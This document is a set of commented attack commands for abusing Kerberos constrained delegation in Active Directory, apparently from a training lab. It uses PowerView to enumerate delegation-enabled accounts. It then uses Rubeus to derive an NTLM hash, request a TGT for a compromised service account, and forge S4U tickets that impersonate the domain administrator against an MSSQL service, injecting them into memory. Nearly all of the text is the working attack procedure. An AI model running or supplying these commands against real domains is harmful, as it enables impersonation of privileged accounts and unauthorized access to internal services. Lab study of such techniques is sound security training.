#Enumerate constrained delegation (with powerview)
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#Assuming there is a constrained delegation for MSSQL with IISSvc account
#we'll simulate a compromise of the IISSvc account and abuse that to gain access to the MSSQL instance on CDC01.

#We need the NTLM hash, if we have the clear password, we can do like this

.\Rubeus.exe hash /password:lab

#Next, we'll use Rubeus to generate a TGT for IISSvc with the asktgt command by supplying the username (/user), 
#domain (/domain), and NTLM hash (/rc4):
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

#Armed with the Base64-encoded TGT for IISSvc, we are ready to invoke the S4U extensions.

#We can do this with Rubeus by first specifying the s4u command and then providing the Base64-encoded TGT (/ticket) and 
#the username we want to impersonate (/impersonateuser), in our case, the administrator account of the domain. 
#This will make use of S4U2Self.

#We'll also supply the SPN of the service (/msdsspn), which is used with S4U2Proxy and finally the /ptt flag to directly
# inject it into memory:

.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt

#At this step we can connect to MSSQL in a context of administrator
